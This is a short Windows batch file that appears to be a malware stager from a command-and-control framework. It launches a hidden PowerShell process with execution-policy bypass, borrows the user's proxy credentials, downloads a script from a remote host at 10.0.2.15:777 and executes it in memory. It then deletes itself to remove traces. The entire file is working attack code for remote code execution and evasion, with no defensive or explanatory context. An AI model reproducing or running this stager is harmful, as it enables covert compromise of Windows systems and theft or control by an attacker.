@echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.0.2.15:777/download/powershell/VG9rZW5cQWxsXDE6aXJvbnB5dGhvbl9hbXNp') -UseBasicParsing|iex"
(goto) 2>nul & del "%~f0"
